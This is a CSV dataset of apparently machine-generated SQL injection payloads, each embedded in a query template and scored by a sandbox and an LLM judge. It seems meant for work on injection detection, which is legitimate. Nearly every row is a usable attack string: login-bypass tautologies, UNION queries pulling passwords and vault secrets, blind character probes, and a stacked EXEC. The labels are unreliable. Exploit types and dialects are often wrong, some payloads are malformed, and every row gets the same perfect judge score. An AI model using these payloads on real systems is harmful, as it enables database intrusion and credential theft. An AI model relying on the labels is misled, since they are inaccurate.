query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00307,"%' AND ascii(SUBSTRING(@@version, 1, 1)) = 83 --","SELECT * FROM products WHERE name LIKE '%%' AND ascii(SUBSTRING(@@version, 1, 1)) = 83 --%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Parameter"", ""Column"", ""Ascii"", ""Identifier"", ""Var"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00308,% OR (CASE WHEN DBMS_RANDOM.VALUE > 0 THEN 'x' = 'x' ELSE 'y' = 'z' END) --,SELECT * FROM products WHERE name LIKE '%% OR (CASE WHEN DBMS_RANDOM.VALUE > 0 THEN 'x' = 'x' ELSE 'y' = 'z' END) --%',encoding_obfuscation,search,1,0,0.0,True,postgres,"[""If"", ""Column"", ""Or"", ""Paren"", ""Identifier"", ""GT"", ""Case"", ""Placeholder"", ""EQ"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00309,"%' UNION ALL SELECT NULL, NULL, ASCII(VAULT_PASSWORD), NULL FROM VAULT_TABLE --","SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT NULL, NULL, ASCII(VAULT_PASSWORD), NULL FROM VAULT_TABLE --%'",encoding_obfuscation,search,1,0,0.0,True,default,"[""Union"", ""Column"", ""Ascii"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00311,"[""%\' AND \""users\"".\""id\"" = (SELECT 1 FROM (SELECT char(65,66,67)) AS t)"", ""CHAR(49)% --"", ""(SELECT * FROM (SELECT \'\'=\'\') WHERE 0=1 UNION SELECT NULL, (CASE WHEN (1=1) THEN (SELECT char(97,98,99))); --"", ""--%\' OR 1=1--"", ""1\' OR (SELECT 67 FROM (SELECT * FROM (SELECT 1)) WHERE 'x'= 'x"")]","SELECT * FROM users WHERE id = [""%\' AND \""users\"".\""id\"" = (SELECT 1 FROM (SELECT char(65,66,67)) AS t)"", ""CHAR(49)% --"", ""(SELECT * FROM (SELECT \'\'=\'\') WHERE 0=1 UNION SELECT NULL, (CASE WHEN (1=1) THEN (SELECT char(97,98,99))); --"", ""--%\' OR 1=1--"", ""1\' OR (SELECT 67 FROM (SELECT * FROM (SELECT 1)) WHERE 'x'= 'x"")]",encoding_obfuscation,user_lookup,1,0,0.0,True,tsql,"[""Column"", ""Identifier""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00312,"%\' OR (SELECT COUNT(*) FROM (SELECT UPPER('a')) AS t WHERE 1=1)""","SELECT * FROM users WHERE id = %\' OR (SELECT COUNT(*) FROM (SELECT UPPER('a')) AS t WHERE 1=1)""",encoding_obfuscation,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Upper"", ""Identifier"", ""TableAlias"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Count""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00314,"--%\' UNION ALL(SELECT 1,2,3,4 FROM users WHERE username LIKE 'admin')#""","SELECT * FROM users WHERE id = --%\' UNION ALL(SELECT 1,2,3,4 FROM users WHERE username LIKE 'admin')#""",encoding_obfuscation,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00318,"1' OR (SELECT DATABASE()) = 'database_name' --""","SELECT * FROM users WHERE id = 1' OR (SELECT DATABASE()) = 'database_name' --""",encoding_obfuscation,user_lookup,1,0,0.0,True,mysql,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""CurrentSchema"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00320,1%2f'--%0a,SELECT * FROM orders WHERE status = '1%2f'--%0a' ORDER BY date DESC,encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00322,"and (dbms_xmlgen.getxmltype('%3cscript%3efunction+b(){alert(\'XSS\');}%3c/script%3e')%2b'%2ftest')--""","SELECT * FROM orders WHERE status = 'and (dbms_xmlgen.getxmltype('%3cscript%3efunction+b(){alert(\'XSS\');}%3c/script%3e')%2b'%2ftest')--""' ORDER BY date DESC",encoding_obfuscation,order_filter,1,0,0.0,True,mysql,"[""Column"", ""Paren"", ""Identifier"", ""Where"", ""Dot"", ""And"", ""Select"", ""Mod"", ""Table"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Alias"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00323,"`status`=`' AND ASCII(SUBSTRING((SELECT USERNAME FROM USERS LIMIT 1), 1, 1))!=85 UNION ALL SELECT NULL --","SELECT * FROM orders WHERE status = '`status`=`' AND ASCII(SUBSTRING((SELECT USERNAME FROM USERS LIMIT 1), 1, 1))!=85 UNION ALL SELECT NULL --' ORDER BY date DESC",encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Ascii"", ""Identifier"", ""Where"", ""NEQ"", ""Null"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Limit"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00324,"1%2F' OR LOWER(SUBSTRING(VERSION(), 1, 1)) LIKE '%5'","SELECT * FROM orders WHERE status = '1%2F' OR LOWER(SUBSTRING(VERSION(), 1, 1)) LIKE '%5'' ORDER BY date DESC",encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Lower"", ""Like"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00325,"1%' UNION SELECT CONCAT(CHAR(84), CHAR(79), CHAR(82)) AS result --","SELECT * FROM orders WHERE status = '1%' UNION SELECT CONCAT(CHAR(84), CHAR(79), CHAR(82)) AS result --' ORDER BY date DESC",encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Concat"", ""Identifier"", ""Where"", ""Select"", ""Chr"", ""Table"", ""Star"", ""EQ"", ""From"", ""Alias"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00326,'1' AND CAST((SELECT @@VERSION) AS VARCHAR) LIKE '1%2F',SELECT * FROM orders WHERE status = ''1' AND CAST((SELECT @@VERSION) AS VARCHAR) LIKE '1%2F'' ORDER BY date DESC,encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Parameter"", ""Var"", ""And"", ""DataType"", ""Select"", ""Subquery"", ""Like"", ""Cast"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00327,1' OR (SELECT CHAR(83) + CHAR(82) + CHAR(73) + CHAR(78) FROM DUAL) LIKE '1%2F',SELECT * FROM orders WHERE status = '1' OR (SELECT CHAR(83) + CHAR(82) + CHAR(73) + CHAR(78) FROM DUAL) LIKE '1%2F'' ORDER BY date DESC,encoding_obfuscation,order_filter,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Add"", ""Chr"", ""Subquery"", ""Table"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00328,"1' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) != 71","SELECT * FROM orders WHERE status = '1' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) != 71' ORDER BY date DESC",encoding_obfuscation,order_filter,1,0,0.0,True,mysql,"[""Column"", ""Ascii"", ""Identifier"", ""Where"", ""NEQ"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""CurrentSchema"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00330,"'%""%20)%20OR%201=(SELECT%20CASE%20WHEN%20(SELECT%201%20FROM%20dual)%20=1%20THEN%201%20ELSE%200%20END)%20AND%20('","INSERT INTO comments (user_id, body) VALUES (1, ''%""%20)%20OR%201=(SELECT%20CASE%20WHEN%20(SELECT%201%20FROM%20dual)%20=1%20THEN%201%20ELSE%200%20END)%20AND%20('')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,"[""Literal""]",True,complete_query,nested_injection,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00332,"--%2B1' AND 1=1 UNION SELECT 1,2,3,4--","INSERT INTO comments (user_id, body) VALUES (1, '--%2B1' AND 1=1 UNION SELECT 1,2,3,4--')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00333,"%23SELECT%20DBMS_CRYPTO.DES_DECRYPT(UTL_RAW.CAST_TO_RAW('%23'),TO_CHAR(2))--","INSERT INTO comments (user_id, body) VALUES (1, '%23SELECT%20DBMS_CRYPTO.DES_DECRYPT(UTL_RAW.CAST_TO_RAW('%23'),TO_CHAR(2))--')",encoding_obfuscation,comment_insert,1,0,0.0,True,mysql,"[""Column"", ""Identifier"", ""ToChar"", ""Where"", ""Dot"", ""Select"", ""Table"", ""Mod"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00334,--%2B1' AND (SELECT 1 FROM (SELECT 1 FROM DUAL WHERE ROWNUM=1))=1--,"INSERT INTO comments (user_id, body) VALUES (1, '--%2B1' AND (SELECT 1 FROM (SELECT 1 FROM DUAL WHERE ROWNUM=1))=1--')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00335,"--+CHAR(49)%20AND%20(UPPER(SUBSTRING((SELECT%20name%20FROM%20users%20WHERE%20id=1),1,1)))%20LIKE%20'%","INSERT INTO comments (user_id, body) VALUES (1, '--+CHAR(49)%20AND%20(UPPER(SUBSTRING((SELECT%20name%20FROM%20users%20WHERE%20id=1),1,1)))%20LIKE%20'%')",encoding_obfuscation,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00337,1' and 1=2 UNION ALL SELECT * FROM information_schema.users --,SELECT * FROM users WHERE username = '1' and 1=2 UNION ALL SELECT * FROM information_schema.users --' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00338,1' OR EXISTS(SELECT * FROM users WHERE username LIKE 'admin%')--,SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT * FROM users WHERE username LIKE 'admin%')--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Like"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00339,1' AND 1=(SELECT 1 FROM (SELECT 1 FROM users LIMIT 1) AS t),SELECT * FROM users WHERE username = '1' AND 1=(SELECT 1 FROM (SELECT 1 FROM users LIMIT 1) AS t)' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""TableAlias"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Limit"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00340,"1' AND ASCII(SUBSTRING(password, 1, 1)) > 100--","SELECT * FROM users WHERE username = '1' AND ASCII(SUBSTRING(password, 1, 1)) > 100--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00341,"1' AND DBMS_RANDOM.VALUE(0,1)=0--","SELECT * FROM users WHERE username = '1' AND DBMS_RANDOM.VALUE(0,1)=0--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Dot"", ""And"", ""Select"", ""Table"", ""Star"", ""Anonymous"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00342,1' AND (SELECT COUNT(*) FROM (SELECT username FROM users WHERE username = 'admin' LIMIT 1) AS subquery) --,SELECT * FROM users WHERE username = '1' AND (SELECT COUNT(*) FROM (SELECT username FROM users WHERE username = 'admin' LIMIT 1) AS subquery) --' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""TableAlias"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Limit"", ""EQ"", ""From"", ""Literal"", ""Count""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00344,"1' AND EXISTS(SELECT * FROM users WHERE username = 'admin' AND SUBSTR(password, 1, 1) = 'a' AND 1=2)","SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT * FROM users WHERE username = 'admin' AND SUBSTR(password, 1, 1) = 'a' AND 1=2)' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00345,"1' AND (LENGTH(username) - LENGTH(REPLACE(username, 'a', ''))) > 0 --","SELECT * FROM users WHERE username = '1' AND (LENGTH(username) - LENGTH(REPLACE(username, 'a', ''))) > 0 --' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""Column"", ""Paren"", ""Identifier"", ""GT"", ""Where"", ""Sub"", ""And"", ""Select"", ""Table"", ""Star"", ""EQ"", ""Replace"", ""From"", ""Literal"", ""Length""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00346,1' AND (SELECT CAST(HEX(0x41) AS CHAR) FROM (SELECT 1 FROM users WHERE username LIKE 'admin%' LIMIT 1) AS alias) = 'A',SELECT * FROM users WHERE username = '1' AND (SELECT CAST(HEX(0x41) AS CHAR) FROM (SELECT 1 FROM users WHERE username LIKE 'admin%' LIMIT 1) AS alias) = 'A'' AND password = 'anything',nested_injection,login,1,0,0.0,True,mysql,"[""Hex"", ""Column"", ""Identifier"", ""TableAlias"", ""HexString"", ""Where"", ""And"", ""DataType"", ""Select"", ""Subquery"", ""Table"", ""Like"", ""Star"", ""Cast"", ""EQ"", ""Limit"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00347,(' AND 1=1 OR ('%') = (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)) --,SELECT * FROM products WHERE name LIKE '%(' AND 1=1 OR ('%') = (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)) --%',nested_injection,search,1,0,0.0,True,default,"[""If"", ""Column"", ""Or"", ""Paren"", ""Identifier"", ""Case"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00348,"1' UNION ALL SELECT NULL, (CHAR(66)||CHAR(67)||CHAR(79)||CHAR(101)), NULL --","SELECT * FROM products WHERE name LIKE '%1' UNION ALL SELECT NULL, (CHAR(66)||CHAR(67)||CHAR(79)||CHAR(101)), NULL --%'",nested_injection,search,1,0,0.0,True,default,"[""Union"", ""Column"", ""Paren"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Chr"", ""Literal"", ""Table"", ""Star"", ""EQ"", ""From"", ""DPipe""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00349,' OR EXISTS(SELECT 1 FROM products WHERE product_id = (SELECT user_id FROM users WHERE username LIKE '%'))--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM products WHERE product_id = (SELECT user_id FROM users WHERE username LIKE '%'))--%',nested_injection,search,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Like"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00350,1' AND 6714 > (SELECT MAX(price) FROM products WHERE name LIKE '%')--,SELECT * FROM products WHERE name LIKE '%1' AND 6714 > (SELECT MAX(price) FROM products WHERE name LIKE '%')--%',nested_injection,search,1,0,0.0,True,default,"[""Column"", ""Max"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00351,1' AND 1=1; DECLARE @x VARCHAR(100); SET @x = CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101); EXEC (@x)--,SELECT * FROM products WHERE name LIKE '%1' AND 1=1; DECLARE @x VARCHAR(100); SET @x = CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101); EXEC (@x)--%',nested_injection,search,1,0,0.0,True,postgres,"[""Parameter"", ""Column"", ""Set"", ""Identifier"", ""Var"", ""Where"", ""Command"", ""And"", ""Chr"", ""Select"", ""SetItem"", ""Star"", ""Table"", ""EQ"", ""From"", ""Add"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00353,-1' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < 1 LIMIT 1)) #,SELECT * FROM products WHERE name LIKE '%-1' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < 1 LIMIT 1)) #%',nested_injection,search,1,0,0.0,True,mysql,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""LT"", ""EQ"", ""Limit"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00354,' AND 1=1 OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_status = 'pending' LIMIT 1)) --,SELECT * FROM products WHERE name LIKE '%' AND 1=1 OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_status = 'pending' LIMIT 1)) --%',nested_injection,search,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Limit"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00355,-1' AND (SELECT 1 FROM (SELECT * FROM categories WHERE category_name LIKE '%Electronics%' LIMIT 1)) --,SELECT * FROM products WHERE name LIKE '%-1' AND (SELECT 1 FROM (SELECT * FROM categories WHERE category_name LIKE '%Electronics%' LIMIT 1)) --%',nested_injection,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Like"", ""Star"", ""Limit"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00356,' OR EXISTS((SELECT * FROM sessions WHERE session_token = (SELECT user_id FROM users WHERE username LIKE '%john%'))) --,SELECT * FROM products WHERE name LIKE '%' OR EXISTS((SELECT * FROM sessions WHERE session_token = (SELECT user_id FROM users WHERE username LIKE '%john%'))) --%',nested_injection,search,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Like"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00357,"--' UNION ALL SELECT NULL, NULL, (SELECT 1 FROM users WHERE username IS NOT NULL)--","SELECT * FROM users WHERE id = --' UNION ALL SELECT NULL, NULL, (SELECT 1 FROM users WHERE username IS NOT NULL)--",nested_injection,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00358,' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE email LIKE '%')--,SELECT * FROM users WHERE id = ' OR 1=1 AND EXISTS(SELECT 1 FROM users WHERE email LIKE '%')--,nested_injection,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Like"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00359,' OR 1=(SELECT 1 FROM users WHERE id=1),SELECT * FROM users WHERE id = ' OR 1=(SELECT 1 FROM users WHERE id=1),nested_injection,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00360,"' OR ASCII(SUBSTRING(username, 1, 1))>97 AND (SELECT 1 FROM users WHERE id=1)","SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING(username, 1, 1))>97 AND (SELECT 1 FROM users WHERE id=1)",nested_injection,user_lookup,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Or"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00361,"--' UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM users WHERE username<> '')--","SELECT * FROM users WHERE id = --' UNION ALL SELECT NULL, NULL, (SELECT COUNT(*) FROM users WHERE username<> '')--",nested_injection,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00362,1' AND '1'='1' OR EXISTS((SELECT 1 FROM users WHERE id IN (SELECT 1 FROM users)))--,SELECT * FROM users WHERE id = 1' AND '1'='1' OR EXISTS((SELECT 1 FROM users WHERE id IN (SELECT 1 FROM users)))--,nested_injection,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""In"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00363,1' OR '1'LIKE'%,SELECT * FROM users WHERE id = 1' OR '1'LIKE'%,nested_injection,user_lookup,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00364,"--' UNION ALL SELECT NULL, NULL, (SELECT (CASE WHEN 1=1 THEN 1 ELSE 0 END))--","SELECT * FROM users WHERE id = --' UNION ALL SELECT NULL, NULL, (SELECT (CASE WHEN 1=1 THEN 1 ELSE 0 END))--",nested_injection,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00365,' OR 1=1 AND EXISTS((SELECT (CASE WHEN 1=1 THEN 1 ELSE 0 END) FROM users))--,SELECT * FROM users WHERE id = ' OR 1=1 AND EXISTS((SELECT (CASE WHEN 1=1 THEN 1 ELSE 0 END) FROM users))--,nested_injection,user_lookup,1,0,0.0,True,default,"[""If"", ""Column"", ""Or"", ""Paren"", ""Identifier"", ""Case"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
